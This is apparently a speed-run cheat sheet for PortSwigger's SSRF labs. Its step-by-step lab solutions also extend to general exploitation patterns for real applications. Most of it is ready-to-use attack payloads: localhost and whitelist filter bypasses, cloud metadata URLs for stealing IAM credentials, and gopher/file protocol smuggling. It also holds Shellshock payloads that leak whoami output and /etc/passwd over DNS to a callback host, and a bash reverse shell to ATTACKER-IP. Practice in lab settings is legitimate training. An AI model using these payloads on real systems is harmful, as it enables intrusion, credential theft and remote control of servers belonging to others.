# SSRF Quick-Start Guide

Lightning-fast reference for exploiting Server-Side Request Forgery vulnerabilities. Get from zero to exploitation in minutes.

## Table of Contents

1. [Instant Lab Solutions](#instant-lab-solutions)
2. [Fast Exploitation Checklist](#fast-exploitation-checklist)
3. [Quick Payloads](#quick-payloads)
4. [Burp Suite Speed Tips](#burp-suite-speed-tips)
5. [Common Patterns](#common-patterns)

---

## Instant Lab Solutions

### Lab 1: Basic SSRF Against Localhost (2 min)

```
1. Product page → Check stock → Intercept
2. Change: stockApi=http://localhost/admin
3. See delete URL in response
4. Change: stockApi=http://localhost/admin/delete?username=carlos
5. Send → Done ✓
```

**One-liner payload**:
```
stockApi=http://localhost/admin/delete?username=carlos
```

---

### Lab 2: Backend System Scan (3 min)

```
1. Check stock → Intercept → Send to Intruder
2. Position: stockApi=http://192.168.0.§1§:8080/admin
3. Payload: Numbers 1-255
4. Start → Sort by Status Code (find 200)
5. Repeater → Change to: /admin/delete?username=carlos
6. Send → Done ✓
```

**Fast Intruder config**:
- Attack type: Sniper
- Payload: Numbers, 1, 255, 1
- Resource pool: Maximum threads

---

### Lab 3: Blacklist Bypass (2 min)

```
1. stockApi=http://127.1/%2561dmin
2. Observe admin panel
3. Change: http://127.1/%2561dmin/delete?username=carlos
4. Send → Done ✓
```

**Key tricks**:
- `127.1` = localhost bypass
- `%2561` = double-encoded 'a' (bypasses /admin filter)

---

### Lab 4: Whitelist Bypass (3 min)

```
1. stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
2. Observe admin panel
3. Change to: .../admin/delete?username=carlos
4. Send → Done ✓
```

**Key trick**:
- `%2523` = double-encoded # (fragment)
- Parser sees @stock... as host, connects to localhost

---

### Lab 5: Blind SSRF (1 min)

```
1. Burp Collaborator → Copy payload
2. Product page → Intercept
3. Change: Referer: http://YOUR-COLLABORATOR.net
4. Send
5. Collaborator → Poll now → Done ✓
```

**Instant detection**: DNS + HTTP interactions confirm SSRF

---

### Lab 6: Shellshock (5 min)

```
1. Collaborator → Copy payload
2. Product → Intercept → Send to Intruder
3. User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR.net
4. Referer: http://192.168.0.§1§:8080
5. Payload: Numbers 1-255 → Start
6. Collaborator → Poll → Extract username from DNS
7. Submit → Done ✓
```

**Fast track**: Start attack immediately, poll Collaborator every 30 seconds

---

### Lab 7: OpenID SSRF (4 min)

```
1. Log in: wiener / peter
2. Discover: /.well-known/openid-configuration → Find /reg endpoint
3. POST /reg:
   {
     "redirect_uris": ["https://example.com"],
     "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
   }
4. Copy client_id from response
5. GET /client/CLIENT_ID/logo
6. Extract SecretAccessKey from response
7. Submit → Done ✓
```

**Speed tip**: Use Repeater for all requests, no need for browser after login

---

### Lab 8: Flawed Parsing (5 min)

```
1. GET request → Repeater
2. Change to: GET https://LAB-ID.web-security-academy.net/ HTTP/1.1
3. Host: 192.168.0.§1§:8080
4. Send to Intruder
5. Intruder → Uncheck "Update Host header to match target"
6. Payload: Numbers 1-255 → Start → Find 200
7. Repeater → Change path to /admin
8. Extract CSRF token
9. POST https://LAB-ID.../admin/delete with token + username=carlos
10. Done ✓
```

**Critical**: Must disable Host header update in Intruder!

---

## Fast Exploitation Checklist

### Step 1: Identify SSRF (30 seconds)

Look for parameters:
```
url=
uri=
path=
dest=
redirect=
fetch=
page=
callback=
webhook=
stockApi=
```

### Step 2: Test Localhost (30 seconds)

```
http://localhost/
http://127.0.0.1/
http://127.1/
http://[::1]/
```

### Step 3: Find Admin (1 minute)

Common paths:
```
/admin
/administrator
/manage
/management
/admin/delete?username=carlos
```

### Step 4: Exploit (1 minute)

If blocked, try bypasses (see Quick Payloads below)

---

## Quick Payloads

### Localhost Representations

```bash
# Standard
http://127.0.0.1/
http://localhost/

# Shorthand (bypasses blacklist)
http://127.1/
http://127.0.1/

# Decimal
http://2130706433/

# Hex
http://0x7f000001/

# Octal
http://017700000001/

# IPv6
http://[::1]/

# Zero
http://0/
```

**Use case**: When `localhost` or `127.0.0.1` is blacklisted

---

### Path Encoding

```bash
# Single encoding
http://127.0.0.1/%61dmin

# Double encoding (bypasses filters)
http://127.0.0.1/%2561dmin

# Full double
http://127.0.0.1/%2561d%256din/%2564%2565%256c%2565%2574%2565
```

**Use case**: When `/admin` is blacklisted

---

### Whitelist Bypasses

```bash
# Credentials format
http://localhost@trusted.com

# Fragment with double encoding
http://localhost:80%2523@trusted.com/

# Subdomain confusion
http://trusted.com.attacker.com/

# Open redirect chain
http://trusted.com/redirect?url=http://localhost/
```

**Use case**: When only trusted domains are allowed

---

### Cloud Metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google
```

**Use case**: AWS/Azure/GCP credential theft

---

### Blind SSRF Detection

```bash
# Burp Collaborator
http://abc123.burpcollaborator.net

# DNS exfiltration
http://$(whoami).abc123.burpcollaborator.net

# Subdomain encoding
http://ssrf-test.abc123.burpcollaborator.net
```

**Use case**: When no response is visible

---

### Shellshock Payloads

```bash
# Basic whoami
() { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR

# Read file
() { :; }; /usr/bin/nslookup $(cat /etc/passwd | base64 | cut -c1-50).COLLABORATOR

# Current directory
() { :; }; /usr/bin/nslookup $(pwd | tr '/' '-').COLLABORATOR

# Reverse shell
() { :; }; /bin/bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

**Use case**: RCE on internal systems via User-Agent

---

### Protocol Smuggling

```bash
# Gopher (Redis)
gopher://127.0.0.1:6379/_KEYS%20*

# File read
file:///etc/passwd

# Dict (memcached)
dict://127.0.0.1:11211/stats

# LDAP
ldap://127.0.0.1:389/dc=example,dc=com
```

**Use case**: Interact with internal services

---

## Burp Suite Speed Tips

### Keyboard Shortcuts

```
Ctrl+R      → Send to Repeater
Ctrl+I      → Send to Intruder
Ctrl+Space  → Send request
Ctrl+Shift+R → Resend request in Repeater
```

### Fast Intruder Setup

```
1. Set position: Select text → Click "Add §"
2. Payloads: Numbers, 1, 255, 1
3. Start → Sort by "Status code" column
4. Double-click 200 response → Auto-sends to Repeater
```

### Collaborator Workflow

```
1. Burp menu → Collaborator client → Keep open
2. Copy payload once, reuse in multiple tests
3. Poll every 30-60 seconds during attacks
4. Filter by "Protocol" for quick analysis
```

### Repeater Tips

```
1. Use tabs for different payloads
2. Right-click → "Show response in browser" for visual testing
3. Ctrl+U to URL-encode selection
4. Ctrl+Shift+U to URL-decode
```

---

## Common Patterns

### Pattern 1: Stock Check Features

**Vulnerable**:
```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

**Exploit**:
```http
stockApi=http://localhost/admin
```

---

### Pattern 2: Image/Avatar Upload

**Vulnerable**:
```http
POST /user/avatar HTTP/1.1

avatar_url=https://example.com/image.jpg
```

**Exploit**:
```http
avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

### Pattern 3: Webhook Configuration

**Vulnerable**:
```http
POST /api/webhooks HTTP/1.1

{
  "url": "https://webhook.site/abc123"
}
```

**Exploit**:
```json
{
  "url": "http://localhost:8080/admin"
}
```

---

### Pattern 4: PDF/Document Generation

**Vulnerable**:
```http
POST /generate-pdf HTTP/1.1

{
  "html": "<img src='https://example.com/logo.png'>"
}
```

**Exploit**:
```json
{
  "html": "<img src='http://169.254.169.254/latest/meta-data/'>"
}
```

---

### Pattern 5: OAuth/OpenID Callbacks

**Vulnerable**:
```http
POST /oauth/register HTTP/1.1

{
  "redirect_uri": "https://client.com/callback",
  "logo_uri": "https://client.com/logo.png"
}
```

**Exploit**:
```json
{
  "redirect_uri": "https://client.com/callback",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

---

### Pattern 6: Analytics/Referer Processing

**Vulnerable**:
```http
GET /product?id=1 HTTP/1.1
Referer: https://google.com
```

**Exploit**:
```http
Referer: http://abc123.burpcollaborator.net
```

---

## Speed Testing Workflow

### 5-Minute Full SSRF Test

**Minute 1**: Identify parameter
```
1. Proxy on → Browse application
2. Search history for: url, uri, fetch, callback, webhook
3. Send interesting request to Repeater
```

**Minute 2**: Test localhost
```
1. Change parameter: http://localhost/
2. Observe response change
3. Try: http://127.0.0.1/admin
```

**Minute 3**: Find admin endpoint
```
1. Try common paths: /admin, /manage, /internal
2. Note working endpoint
```

**Minute 4**: Bypass filters (if blocked)
```
1. Try: http://127.1/
2. Try: http://127.0.0.1/%2561dmin
3. Try: http://localhost:80%2523@trusted.com/admin
```

**Minute 5**: Complete exploitation
```
1. Access delete endpoint
2. Extract any tokens needed
3. Execute delete action
4. Lab solved ✓
```

---

## Instant Recognition

### Is This SSRF?

**YES** if you see:
- Parameter accepts URL/URI
- Application fetches remote content
- Webhooks, callbacks, redirects
- Image/document processors
- Stock check, API integration features
- OAuth/OpenID configuration

**Test with**: `http://localhost/` or Burp Collaborator

### Response Indicators

**Exploitable**:
- Different response for localhost vs external
- Internal service responses visible
- Timeout differences between IPs
- DNS/HTTP callbacks received

**Not Exploitable**:
- Identical responses for all inputs
- Strong validation error messages
- No callbacks in blind testing

---

## Emergency Bypass Cheat Sheet

**When blocked**: Try these in order

1. **Alternative IPs**:
   ```
   127.1
   127.0.1
   2130706433
   0x7f000001
   [::1]
   ```

2. **Encoding**:
   ```
   %61dmin (single)
   %2561dmin (double)
   %C0%AE%C0%AE (UTF-8)
   ```

3. **Parsing tricks**:
   ```
   http://localhost:80%2523@trusted.com
   http://trusted.com@localhost
   http://localhost#@trusted.com
   ```

4. **Protocol switch**:
   ```
   gopher://
   file://
   dict://
   ```

5. **DNS rebinding**:
   ```
   http://rebinder.net (set up rebinding)
   http://rbndr.us (public service)
   ```

---

## Lab Completion Times

| Lab | Difficulty | Time | Key Technique |
|-----|-----------|------|---------------|
| Basic Localhost | Apprentice | 2 min | Direct localhost access |
| Backend System | Apprentice | 3 min | Intruder IP scan |
| Blacklist Filter | Practitioner | 2 min | Double encoding |
| Whitelist Filter | Expert | 3 min | Fragment encoding |
| Blind OOB | Practitioner | 1 min | Collaborator |
| Shellshock | Expert | 5 min | DNS exfiltration |
| OpenID | Expert | 4 min | Metadata access |
| Flawed Parsing | Expert | 5 min | Host header injection |

**Total time to complete all labs**: ~25 minutes with practice

---

## Pro Tips

1. **Always start with Collaborator**: Quick blind SSRF detection
2. **Use Intruder for scanning**: Automate IP/port enumeration
3. **Keep payloads in clipboard**: Paste common bypasses instantly
4. **Check response length**: Different lengths = different responses = exploitable
5. **Read error messages**: Often reveal internal paths/IPs
6. **Try all protocols**: http, https, gopher, file, dict
7. **Double encode when blocked**: %2561 bypasses many filters
8. **Use Repeater tabs**: Test multiple approaches simultaneously
9. **Monitor Collaborator continuously**: Server-side processing may be delayed
10. **Document working payloads**: Build your personal quick reference

---

## Quick Reference Card

**Print this section for instant access during tests**

```
LOCALHOST BYPASS:
http://127.1/
http://2130706433/
http://[::1]/

PATH BYPASS:
/%2561dmin (double encode)
/%61dmin (single encode)

WHITELIST BYPASS:
http://localhost:80%2523@trusted.com/

AWS METADATA:
http://169.254.169.254/latest/meta-data/iam/security-credentials/

BLIND DETECTION:
Referer: http://abc123.burpcollaborator.net

SHELLSHOCK:
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR
Referer: http://192.168.0.§1§:8080

INTRUDER CONFIG:
- Payload: Numbers, 1-255
- Disable: Update Host header
- Sort by: Status code

OPENID SSRF:
POST /reg
{"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
```

---

*Master these techniques and complete all 8 SSRF labs in under 30 minutes. Practice makes perfect!*
